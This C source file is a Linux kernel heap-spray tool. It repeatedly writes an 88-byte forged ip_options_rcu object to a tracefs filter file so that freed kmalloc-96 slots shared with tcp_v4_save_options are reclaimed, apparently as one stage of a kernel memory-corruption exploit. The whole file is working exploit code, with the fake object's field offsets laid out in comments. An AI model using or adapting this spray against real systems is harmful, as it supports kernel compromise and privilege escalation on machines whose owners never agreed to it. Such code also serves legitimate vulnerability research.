/* filespray.c - generic reclaim spray via any file whose write handler does
 * memdup_user{,_nul} + parse + kfree (immediate churn). Used for call sites
 * like subsystem_filter_write (tracefs events/<subsys>/filter) that share the
 * boot's RANDOM_KMALLOC_CACHES bucket with tcp_v4_save_options.
 *
 * The buffer IS the object (buf index == object offset): fake ip_options_rcu
 * with the ip_options at object+16 (optlen=40 srr=67 rr=68 ts=69 flags=0x28).
 * 88 bytes -> kmalloc-96.
 *
 * Usage: sudo ./filespray <runtime_s> <cpu> <path>
 */
#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <sched.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <unistd.h>

#define CNT 88

int main(int argc, char **argv) {
    int runtime = argc > 1 ? atoi(argv[1]) : 30;
    int cpu = argc > 2 ? atoi(argv[2]) : 0;
    const char *path = argc > 3 ? argv[3] : "/sys/kernel/debug/tracing/events/sched/filter";
    cpu_set_t s;
    CPU_ZERO(&s);
    CPU_SET(cpu, &s);
    sched_setaffinity(0, sizeof(s), &s);

    unsigned char buf[CNT];
    memset(buf, 0x41, sizeof(buf));
    buf[16] = 32; buf[17] = 32; buf[18] = 32; buf[19] = 32;  /* faddr (unused) */
    buf[24] = 40;    /* optlen */
    buf[25] = 67;    /* srr  */
    buf[26] = 68;    /* rr   */
    buf[27] = 69;    /* ts   */
    buf[28] = 0x28;  /* flags: rr_needaddr | ts_needaddr */
    buf[32] = 0x44;  /* __data: printable TS option (not validated on TX) */
    buf[33] = 0x28;
    buf[34] = 0x25;
    buf[35] = 0x20;
    buf[39] = 0x41; buf[40] = 0x42; buf[41] = 0x43; buf[42] = 0x44; /* s1 marker */
    buf[47] = 0x45; buf[48] = 0x46; buf[49] = 0x47; buf[50] = 0x48; /* s3 marker */

    unsigned long n = 0, err = 0;
    time_t t0 = time(NULL);
    while ((int)(time(NULL) - t0) < runtime) {
        for (int i = 0; i < 256; i++) {
            int fd = open(path, O_WRONLY);
            if (fd < 0) { err++; continue; }
            ssize_t r = write(fd, buf, sizeof(buf));
            close(fd);
            if (r < 0) err++; else n++;
        }
    }
    fprintf(stderr, "[filespray %s] writes=%lu err=%lu\n", path, n, err);
    return 0;
}
